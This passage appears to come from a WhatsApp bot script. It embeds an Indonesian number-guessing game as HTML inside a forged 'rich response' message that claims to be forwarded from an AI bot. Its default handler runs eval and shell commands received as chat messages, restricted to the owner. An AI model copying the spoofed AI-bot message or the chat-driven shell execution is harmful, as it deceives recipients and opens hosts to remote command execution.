    border: 2px solid #3a5a7a;
    box-shadow: inset 0 -2px 0 #1a2a4a;
    text-shadow: 0 0 6px #6f8fcf;
    text-align: center;
    white-space: nowrap;
  }

  .ctrl-btn {
    background: #1a2a4a;
    color: #c8dfff;
    border: 2px solid #3a5a7a;
    font-size: 0.75rem;
    font-weight: bold;
    padding: 0.25rem 0.8rem;
    border-radius: 60px;
    box-shadow: inset 0 -4px 0 #0f1a2f, 0 2px 0 #0a1220;
    cursor: pointer;
    transition: 0.06s linear;
    font-family: inherit;
    white-space: nowrap;
  }

  .ctrl-btn:active {
    transform: translateY(2px);
    box-shadow: inset 0 -2px 0 #0f1a2f;
  }

  .msg-box {
    text-align: center;
    font-size: 0.75rem;
    color: #b0c8ff;
    min-height: 1.1rem;
    padding: 0.35rem 0.2rem 0;
    text-shadow: 0 0 8px #4f6faf;
    font-weight: bold;
    line-height: 1.3;
  }

  .msg-box.you  { color: #b0ffb0; text-shadow: 0 0 8px #4aff6a; }
  .msg-box.ai   { color: #e0c8ff; text-shadow: 0 0 8px #a07aff; }
  .msg-box.boom { color: #ffb0b0; text-shadow: 0 0 8px #ff5a5a; }

  .hint {
    color: #6a7a9a;
    text-align: center;
    margin-top: 6px;
    font-size: 0.55rem;
    letter-spacing: 1px;
    opacity: 0.7;
  }
</style>
</head>
<body>

<div class="game-wrapper">
  <div class="level-bar">
    <button class="level-btn active" data-level="easy">EASY</button>
    <button class="level-btn" data-level="medium">MEDIUM</button>
    <button class="level-btn" data-level="hard">HARD</button>
    <button class="level-btn" data-level="master">MASTER</button>
  </div>

  <div class="display-area">
    <div class="number-grid" id="numberGrid"></div>
    <div class="msg-box" id="messageBox">✨ Pilih level, lalu mulai!</div>
  </div>

  <div class="status-panel">
    <div class="score-box" id="scoreDisplay">🧑 0 - 0 🤖</div>
    <button class="ctrl-btn" id="resetBtn">↻ Restart</button>
  </div>

  <div class="hint" id="hintText">👆 kamu vs client · 1 BOOM tersembunyi</div>
</div>

<script>
(function () {
  const TOTAL = 12;

  let boomIndex = -1;
  let revealed = [];
  let owner = [];
  let gameOver = false;
  let yourTurn = true;
  let busy = false;
  let scoreYou = 0;
  let scoreAI = 0;
  let level = 'easy';
  let audioCtx = null;

  const gridEl = document.getElementById('numberGrid');
  const scoreSpan = document.getElementById('scoreDisplay');
  const msgBox = document.getElementById('messageBox');
  const resetBtn = document.getElementById('resetBtn');
  const hintText = document.getElementById('hintText');
  const levelBtns = document.querySelectorAll('.level-btn');

  const LEVEL_INFO = {
    easy:   { name: 'EASY',   desc: '👶 client polos · pilih random',        aiSkill: 0.0  },
    medium: { name: 'MEDIUM', desc: '🧠 client sedang · 30% menghindar',     aiSkill: 0.3  },
    hard:   { name: 'HARD',   desc: '🔥 client pintar · 60% menghindar',     aiSkill: 0.6  },
    master: { name: 'MASTER', desc: '👑 client jenius · 90% menghindar',     aiSkill: 0.9  }
  };

  function initAudio() {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
  }

  function playTone(freq, dur, vol) {
    try {
      initAudio();
      const o = audioCtx.createOscillator();
      const g = audioCtx.createGain();
      o.type = 'sine';
      o.frequency.value = freq;
      g.gain.value = vol;
      g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur / 1000);
      o.connect(g);
      g.connect(audioCtx.destination);
      o.start();
      o.stop(audioCtx.currentTime + dur / 1000);
    } catch (e) {}
  }

  function playSafeYou() { playTone(620, 80, 0.10); }
  function playSafeAI()  { playTone(420, 80, 0.08); }
  function playBoom() {
    playTone(180, 350, 0.20);
    setTimeout(function(){ playTone(130, 300, 0.15); }, 120);
  }
  function playWin() {
    playTone(780, 100, 0.12);
    setTimeout(function(){ playTone(980, 100, 0.12); }, 110);
    setTimeout(function(){ playTone(1180, 140, 0.12); }, 220);
  }
  function playClick() { playTone(500, 50, 0.06); }

  function setMsg(text, cls) {
    msgBox.textContent = text;
    msgBox.className = 'msg-box' + (cls ? ' ' + cls : '');
  }

  function updateScore() {
    scoreSpan.textContent = '🧑 ' + scoreYou + ' - ' + scoreAI + ' 🤖';
  }

  function emptyCells() {
    const arr = [];
    for (let i = 0; i < TOTAL; i++) {
      if (!revealed[i]) arr.push(i);
    }
    return arr;
  }

  function startGame() {
    boomIndex = Math.floor(Math.random() * TOTAL);
    revealed = new Array(TOTAL).fill(false);
    owner = new Array(TOTAL).fill(null);
    gameOver = false;
    busy = false;
    yourTurn = true;
    updateScore();
    setMsg('🎮 Giliran KAMU — pilih angka!', 'you');
    hintText.textContent = '👆 kamu vs client · 1 BOOM tersembunyi';
    renderGrid();
  }

  function renderGrid() {
    gridEl.innerHTML = '';

    for (let i = 0; i < TOTAL; i++) {
      (function (idx) {
        const btn = document.createElement('div');
        btn.className = 'num-btn';

        if (revealed[idx]) {
          if (idx === boomIndex) {
            btn.classList.add('boom');
            btn.textContent = '💥';
          } else if (owner[idx] === 'ai') {
            btn.classList.add('ai');
            btn.textContent = '🤖';
          } else {
            btn.classList.add('revealed');
            btn.textContent = '✅';
          }
          btn.classList.add('disabled');
        } else {
          if (gameOver) {
            btn.classList.add('disabled');
            if (idx === boomIndex) {
              btn.classList.add('boom');
              btn.textContent = '💥';
            } else {
              btn.classList.add('hidden');
              btn.textContent = '?';
            }
          } else {
            btn.textContent = '?';
            btn.classList.add('selected');
          }
        }

        btn.addEventListener('click', function (e) { handleClick(e, idx); });
        btn.addEventListener('touchstart', function (e) {
          e.preventDefault();
          handleClick(e, idx);
        }, { passive: false });

        gridEl.appendChild(btn);
      })(i);
    }
  }

  function handleClick(e, idx) {
    e.stopPropagation();
    e.preventDefault();
    if (gameOver || busy || !yourTurn || revealed[idx]) return;

    initAudio();
    yourTurn = false;
    busy = true;

    if (idx === boomIndex) {
      revealed[idx] = true;
      owner[idx] = 'you';
      gameOver = true;
      busy = false;
      playBoom();
      scoreAI++;
      updateScore();
      setMsg('💥 Kamu kena BOOM! client menang!', 'boom');
      renderGrid();
      return;
    }

    revealed[idx] = true;
    owner[idx] = 'you';
    playSafeYou();
    setMsg('✅ Aman! Giliran client...', 'you');
    renderGrid();

    const delay = level === 'master' ? 500 : level === 'hard' ? 700 : 900;
    setTimeout(aiMove, delay + Math.random() * 400);
  }

  function aiMove() {
    if (gameOver) { busy = false; return; }

    const empty = emptyCells();
    if (empty.length === 0) { busy = false; return; }

    const skill = LEVEL_INFO[level].aiSkill;
    let pick;

    if (Math.random() < skill && empty.length > 1) {
      const safeSkip = [];
      const shuffled = empty.slice().sort(function () { return Math.random() - 0.5; });
      const skipCount = Math.min(Math.floor(skill * 3), empty.length - 1);
      for (let i = 0; i < skipCount; i++) safeSkip.push(shuffled[i]);
      const candidates = empty.filter(function (i) { return safeSkip.indexOf(i) === -1; });
      pick = candidates[Math.floor(Math.random() * candidates.length)];
    } else {
      pick = empty[Math.floor(Math.random() * empty.length)];
    }

    if (pick === boomIndex) {
      revealed[pick] = true;
      owner[pick] = 'ai';
      gameOver = true;
      busy = false;
      playBoom();
      scoreYou++;
      updateScore();
      setMsg('💥 client kena BOOM! KAMU MENANG!', 'boom');
      playWin();
      renderGrid();
      return;
    }

    revealed[pick] = true;
    owner[pick] = 'ai';
    playSafeAI();
    yourTurn = true;
    busy = false;
    setMsg('🎮 Giliran KAMU — pilih angka!', 'you');
    renderGrid();
  }

  levelBtns.forEach(function (btn) {
    btn.addEventListener('click', function () {
      level = btn.dataset.level;
      levelBtns.forEach(function (b) { b.classList.remove('active'); });
      btn.classList.add('active');
      playClick();
      scoreYou = 0;
      scoreAI = 0;
      hintText.textContent = LEVEL_INFO[level].desc;
      startGame();
    });
  });

  resetBtn.addEventListener('click', function () { startGame(); });

  startGame();
})();
</script>

</body>
</html>
    `;

    const data = {
      response_id: "PopiooNixelPopiooNixelPopiooNixel",
      sections: [
        {
          __typename: "GenAIUnifiedResponseSection",
          view_model: {
            __typename: "GenAISingleLayoutViewModel",
            primitive: {
              __typename: "GenAIBotProgressStatusPrimitive",
              title: "KLIK TEKS INI",
              is_in_progress: true
            }
          }
        }
      ],
      embedded_screens: [
        {
          title: "Preview",
          content: [
            {
              __typename: "FOAIDNixelButtonSheets",
              tabs: [
                {
                  id: "tab_0",
                  tab_header: "MISTER-MD",
                  sections: [
                    {
                      __typename: "GenAIUnifiedResponseSection",
                      view_model: {
                        __typename: "GenAISingleLayoutViewModel",
                        primitive: {
                          __typename: "GenAIaeacdsnwHtmlPrimitive",
                          payload: html,
                          url: "https://example.com",
                          trusted_sources: ["example.com"]
                        }
                      }
                    }
                  ],
                  step_entries: []
                }
              ]
            }
          ]
        }
      ]
    };

    await client.relayMessage(
      m.chat,
      {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          botMetadata: {
            messageDisclaimerText: "",
            richResponseSourcesMetadata: {}
          }
        },
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 1,
              unifiedResponse: {
                data: Buffer.from(JSON.stringify(data)).toString('base64')
              },
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
                forwardOrigin: 4
              }
            }
          }
        }
      },
      {
        messageId: await client.generateMessageTag()
      }
    )
  }
  break

  /// ───────────── [ 𝖣𝖾𝖿𝖺𝗎𝗅𝗍 & 𝖤𝗏𝖺𝗅 ] ──────────── ///
  default: {
    if (budy.startsWith('=>')) {
      if (!isOwner) return reply(mess.owner)
      try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await xreply(evaled)
      } catch (err) {
        await xreply(String(err))
      }
    }

    if (m.text.toLowerCase() == "bot") {
      let groupMetadata = await client.groupMetadata(m.chat).catch(e => null)
      let member = groupMetadata.participants.map(u => u.id)
      client.relayMessage(m.chat, {
        extendedTextMessage: {
          text: "*𝖡𝗈𝗍 𝖮𝗇𝗅𝗂𝗇𝖾 𝖲𝖺𝗒𝖺𝗇𝗀 😘*",
          contextInfo: {
            mentionedJid: member,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterName: `${global.namaSaluran}`,
              newsletterJid: `${global.idSaluran}`,
              serverMessageId: 143
            },
            businessMessageForwardInfo: {
              businessOwnerJid: client.decodeJid(client.user.id)
            },
            externalAdReply: {
              automatedGreetingMessageShown: true,
              greetingMessageBody: "𝖡𝗈𝗍𝗌 𝖮𝗇𝗅𝗂𝗇𝖾",
              thumbnail: thumb,
              title: `${m.pushName}`,
              body: `${m.pushName}`,
              mediaType: 1,
              containsAutoReply: true
            }
          }
        }
      }, {})
    }

    if (budy.startsWith('>')) {
      if (!isOwner) return reply(mess.owner)
      try {
        let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await xreply(evaled)
      } catch (err) {
        await xreply(String(err))
      }
    }

    if (budy.startsWith('$')) {
      if (!isOwner) return reply(mess.owner)
      if (!text) return
      exec(budy.slice(2), (err, stdout) => {
        if (err) return xreply(`${err}`)
        if (stdout) return xreply(stdout)
      })
    }
  }
}
} catch (err) {
  console.log(util.format(err));
  let Obj = global.owner
  client.sendMessage(Obj + "@s.whatsapp.net", {
    text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix + command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }
  }, { quoted: m })
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})